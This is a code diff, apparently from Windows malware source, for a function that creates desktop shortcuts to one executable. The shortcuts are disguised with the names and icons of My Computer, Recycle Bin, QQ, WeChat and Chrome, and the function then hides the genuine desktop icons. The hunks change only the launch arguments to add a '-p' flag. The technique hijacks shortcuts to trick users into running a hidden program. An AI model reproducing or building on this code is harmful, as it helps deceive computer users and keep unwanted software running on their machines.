@@ -309,7 +309,7 @@ DWORD __stdcall lnkDesktop(char* exePath, char* szSysDir, char* strUserName, cha
 	wchar_t wszIcoPath[MAX_PATH];
 	lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);
 
-	iRet = createDesktopLnk(wszExePath, L"MyComputer", L"", wszIcoPath, wszLnkUnicode);
+	iRet = createDesktopLnk(wszExePath, L"-p MyComputer", L"", wszIcoPath, wszLnkUnicode);
 	if (iRet)
 	{
 		HideDesktopMyComputer();
@@ -347,7 +347,7 @@ DWORD __stdcall lnkDesktop(char* exePath, char* szSysDir, char* strUserName, cha
 	}
 
 	lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);
-	iRet = createDesktopLnk(wszExePath, L"Recycle", L"", wszIcoPath, wszLnkUnicode);
+	iRet = createDesktopLnk(wszExePath, L"-p Recycle", L"", wszIcoPath, wszLnkUnicode);
 	if (iRet)
 	{
 		HideDesktopRecycle();
@@ -415,7 +415,7 @@ DWORD __stdcall lnkDesktop(char* exePath, char* szSysDir, char* strUserName, cha
 
 		szLinkFileName[0] = szSysDir[0];
 		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);
-		iRet = createDesktopLnk(wszExePath, L"QQ", wszWorkPath, wszIcoPath, wszLnkUnicode);
+		iRet = createDesktopLnk(wszExePath, L"-p QQ", wszWorkPath, wszIcoPath, wszLnkUnicode);
 		if (iRet == FALSE)
 		{
 			/*
@@ -461,7 +461,7 @@ DWORD __stdcall lnkDesktop(char* exePath, char* szSysDir, char* strUserName, cha
 
 		szLinkFileName[0] = szSysDir[0];
 		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);
-		iRet = createDesktopLnk(wszExePath, L"wechat", wszWorkPath, wszIcoPath, wszLnkUnicode);
+		iRet = createDesktopLnk(wszExePath, L"-p WeChat", wszWorkPath, wszIcoPath, wszLnkUnicode);
 		if (iRet)
 		{
 			/*
@@ -503,7 +503,7 @@ DWORD __stdcall lnkDesktop(char* exePath, char* szSysDir, char* strUserName, cha
 		lplstrcpyA(strIco, strDataPath);
 		lplstrcatA(strIco, "chrome.ico");
 		lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);
-		iRet = createDesktopLnk(wszExePath, L"CHROME", wszWorkPath, wszIcoPath, wszLnkUnicode);
+		iRet = createDesktopLnk(wszExePath, L"-p CHROME", wszWorkPath, wszIcoPath, wszLnkUnicode);
 		if (iRet == 0)
 		{
 		}
